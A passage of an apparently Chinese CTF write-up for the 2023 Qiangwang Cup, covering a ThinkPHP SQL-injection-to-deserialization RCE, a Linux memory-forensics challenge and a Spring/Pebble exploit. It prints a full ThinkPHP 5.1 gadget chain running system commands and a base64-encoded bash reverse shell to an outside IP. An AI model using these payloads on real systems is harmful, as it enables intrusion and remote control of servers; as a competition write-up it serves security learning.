aria-hidden="true">img</figcaption></figure><p>跟进，传到updatedata</p><figure><img src="/img/2023第七届强网杯/170482122317310.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Update.php，从数据库里读数据，value限制得很死，但是这里注意到key是没有过滤的，可以sql注入</p><figure><img src="/img/2023第七届强网杯/170482122317311.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>理清一下思路，key注入将序列化的数据传入数据库，读取再反序列化造成rce</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">id=3&amp;name=ls&amp;price=5.00&amp;on_sale_time=2023-12-15T12%3A45&amp;image=a&amp;data`%3d%27  &#123;payload&#125;  %27%09where%09`id`%3d1%23a=1&amp;data=aaa<br></code></pre></td></tr></table></figure><p>网上找的tp5.1链子，这里注意加上array（序列化有markdownToArray函数，getGoodsbyId函数检测<code>YTo</code>前缀）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">Pivot</span>;<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;files = [<span class="hljs-keyword">new</span> <span class="hljs-title class_">Pivot</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>)];<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$aaa</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Windows</span>(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;ls&#x27;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$aaa</span>)));<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>&#123;<br>    <span class="hljs-title class_">abstract</span> <span class="hljs-title class_">class</span> <span class="hljs-title class_">Model</span><br>    &#123;&#125;<br>&#125;<br><span class="hljs-title class_">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">Model</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>\<span class="hljs-title">Output</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$append</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$error</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$parent</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;append[<span class="hljs-string">&#x27;jelly&#x27;</span>] = <span class="hljs-string">&#x27;getError&#x27;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;error = <span class="hljs-keyword">new</span> relation\<span class="hljs-title function_ invoke__">BelongsTo</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-built_in">parent</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Output</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Relation</span></span><br><span class="hljs-class">    </span>&#123;&#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">relation</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">db</span>\<span class="hljs-title class_">Query</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Relation</span>;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OneToOne</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Relation</span></span><br><span class="hljs-class">    </span>&#123;&#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BelongsTo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">OneToOne</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$selfRelation</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$query</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$bindAttr</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;selfRelation = <span class="hljs-literal">false</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;query = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Query</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;bindAttr = [<span class="hljs-string">&#x27;&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">db</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">console</span>\<span class="hljs-title class_">Output</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Query</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$model</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;model = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Output</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">console</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">session</span>\<span class="hljs-title class_">driver</span>\<span class="hljs-title class_">Memcache</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Output</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$styles</span> = [];<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$handle</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;styles = [<span class="hljs-string">&#x27;getAttr&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Memcache</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">session</span>\<span class="hljs-title class_">driver</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">cache</span>\<span class="hljs-title class_">driver</span>\<span class="hljs-title class_">Memcached</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Memcache</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$handler</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span>  = [<br>            <span class="hljs-string">&#x27;expire&#x27;</span>       =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;session_name&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        ];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;handler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Memcached</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">cache</span>\<span class="hljs-title class_">driver</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">Request</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Memcached</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$handler</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$options</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$tag</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-comment">// pop链中需要prefix存在，否则报错</span><br>            <span class="hljs-variable language_">$this</span>-&gt;options = [<span class="hljs-string">&#x27;prefix&#x27;</span>   =&gt; <span class="hljs-string">&#x27;jelly/&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;tag = <span class="hljs-literal">true</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;handler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Request</span><br>    &#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">get</span>     = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filter</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;filter = <span class="hljs-variable">$function</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;get = [<span class="hljs-string">&quot;jelly&quot;</span>=&gt;<span class="hljs-variable">$parameter</span>];<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure><img src="/img/2023第七届强网杯/170482122317312.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023第七届强网杯/170482122317313.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h1 id="强网先锋">强网先锋</h1><h2 id="找到png了吗">找到PNG了吗</h2><p>vol打不开，010打开文件头为<code>EMiL</code>，linux镜像，banner看对应操作系统</p><figure><img src="/img/2023第七届强网杯/170482122317314.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>根据Ubuntu版本制作对应的profile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Plain">root@ubuntu:/home/ddd/Desktop/volatility-master# python vol.py -f ../1.mem --profile=LinuxUbuntux64 linux_banner<br>Volatility Foundation Volatility Framework 2.6.1<br>WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present in vtypes<br>WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present in vtypes<br>Linux version 5.4.0-100-generic (buildd@lcy02-amd64-002) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #113-Ubuntu SMP Thu Feb 3 18:43:29 UTC 2022 (Ubuntu 5.4.0-100.113-generic 5.4.166)<br></code></pre></td></tr></table></figure><p>lsof找到桌面上的文件have_your_fun.jocker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Plain">root@ubuntu:/home/ddd/Desktop/volatility-master# python vol.py -f ../1.mem --profile=LinuxUbuntux64 linux_lsof | grep &quot;Desktop&quot;<br>Volatility Foundation Volatility Framework 2.6.1<br>WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present in vtypes<br>WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present in vtypes<br>0xffff9ce2af3cc680 bash                               2158        4 /home/yuren/Desktop/have_your_fun.jocker<br>0xffff9ce2bac09780 insmod                             2170        3 /home/yuren/Desktop/LiME/src/lime-5.4.0-100-generic.ko<br></code></pre></td></tr></table></figure><p>尝试导出，结果为空</p><p>在010中找<code>have_your_fun.jocker</code>，找到加密脚本</p><p>加密文件，两次rc4，两个密钥都给出</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVER_IP <span class="hljs-string">&quot;192.168.6.1&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVER_PORT 110</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buff[<span class="hljs-number">20000</span>];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-type">char</span>* a, <span class="hljs-type">char</span>* b)</span> </span>&#123;<br>    <span class="hljs-type">char</span> temp = *a;<br>    *a = *b;<br>    *b = temp;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rc4_encrypt_decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* key, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* data, <span class="hljs-type">int</span> data_length)</span> </span>&#123;<br>    <span class="hljs-type">int</span> i, j = <span class="hljs-number">0</span>, t;<br>    <span class="hljs-type">int</span> s[<span class="hljs-number">256</span>];<br>    <span class="hljs-type">int</span> key_length = <span class="hljs-built_in">strlen</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)key);<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;<br>        s[i] = i;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;<br>        j = (j + s[i] + key[i % key_length]) % <span class="hljs-number">256</span>;<br>        t = s[i];<br>        s[i] = s[j];<br>        s[j] = t;<br>    &#125;<br><br>    i = j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; data_length; k++) &#123;<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        j = (j + s[i]) % <span class="hljs-number">256</span>;<br>        t = s[i];<br>        s[i] = s[j];<br>        s[j] = t;<br>        data[k] ^= s[(s[i] + s[j]) % <span class="hljs-number">256</span>];<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> clientSocket = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (clientSocket == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;socket failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> serverAddr;<br>    serverAddr.sin_family = AF_INET;<br>    serverAddr.sin_port = <span class="hljs-built_in">htons</span>(SERVER_PORT);<br>    serverAddr.sin_addr.s_addr = <span class="hljs-built_in">inet_addr</span>(SERVER_IP);<br>    <span class="hljs-built_in">connect</span>(clientSocket, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;serverAddr, <span class="hljs-built_in">sizeof</span>(serverAddr));<br>    <span class="hljs-type">int</span> result = <span class="hljs-built_in">recv</span>(clientSocket, buff, <span class="hljs-built_in">sizeof</span>(buff), <span class="hljs-number">0</span>);<br>    <span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> q[<span class="hljs-number">10</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key[]=<span class="hljs-string">&quot;do_not_care&quot;</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key2[] = <span class="hljs-string">&quot;where_is_the_key&quot;</span>;<br>    FILE* file = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;have_your_fun.jocker&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br>    <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open file failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *str;<br>    str = (<span class="hljs-type">char</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">20000</span>);<br>    <span class="hljs-built_in">memcpy</span>(str, buff, <span class="hljs-number">20000</span>);<br><span class="hljs-built_in">rc4_encrypt_decrypt</span>(key2, str, <span class="hljs-number">20000</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;please give me the key of fun:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,q);<br>    <span class="hljs-built_in">rc4_encrypt_decrypt</span>(key, str, <span class="hljs-number">20000</span>);<br>    <br>    <span class="hljs-built_in">fwrite</span>(buff, <span class="hljs-number">1</span>, <span class="hljs-number">20000</span>, file);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;maybe you go wrong&quot;</span>);<br>    <span class="hljs-built_in">fclose</span>(file);<br>    <span class="hljs-built_in">close</span>(clientSocket);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目要png，用png头加密两次rc4，得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">89504E47:e5afbeba<br></code></pre></td></tr></table></figure><p>根据文件头尾找到加密的png</p><figure><img src="/img/2023第七届强网杯/170482122317315.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>再两次rc4得到png</p><figure><img src="/img/2023第七届强网杯/170482122317316.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>得到flag</p><figure><img src="/img/2023第七届强网杯/170482122317317.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="hello-spring">hello spring</h2><p>题目给的jar包和远程不一样</p><p>然后根据配置文件和源码<code>return "home";</code>写一个<code>home.pebble</code>放在<code>/tmp</code>目录下，作为模板文件</p><figure><img src="/img/2023第七届强网杯/170482122317318.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023第七届强网杯/170482122317319.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>本地搭好环境之后是这样的</p><figure><img src="/img/2023第七届强网杯/170482122317320.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>pom.xml看到pebble组件版本为3.1.5</p><figure><img src="/img/2023第七届强网杯/170482122317321.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以搜索到https://github.com/Y4tacker/Web-Security/issues/3?cve=title</p><p>vps上写1.xml，弹shell</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> &gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjE4NC80NTY3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span 